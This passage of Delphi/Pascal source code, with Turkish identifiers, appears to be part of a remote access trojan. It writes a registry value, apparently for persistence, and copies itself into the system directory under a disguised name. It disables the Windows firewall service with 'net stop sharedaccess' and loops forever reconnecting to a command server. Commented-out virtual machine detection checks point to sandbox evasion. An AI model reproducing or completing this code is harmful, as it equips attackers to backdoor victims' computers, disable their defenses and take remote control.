RegSetValueEx(anahtar,anahtaradi,0,1,PChar(Yol),lstrlen(PChar(Yol))+1);
RegCloseKey(anahtar);
end;

procedure InitiateMasterConnection(Thread: TThread2);
begin
  while 0 < 1 do begin
  MainSocket := TClientSocket.Create;
    MainSocket.Connect(adres, port);
    if MainSocket.Connected then CheckConnection(Thread, MainSocket);
    sleep(9000);
  end;
end;

begin
  //if IsVMwarePresent then application.Terminate;
  //if IsVPCPresent then application.Terminate;
  aciliskontrol;
  kurbeni(sysdizini+'\'+tashakli_isim);
  shellexecute(0,'open', 'net.exe',' stop sharedaccess',0,0);
  sleep(200);
  Application := TApplication.Create;
  TThread2.Create(@InitiateMasterConnection, 0);
  while 0 < 1 do begin
    Sleep(1);
    Application.ProcessMessages;
  end;
end.
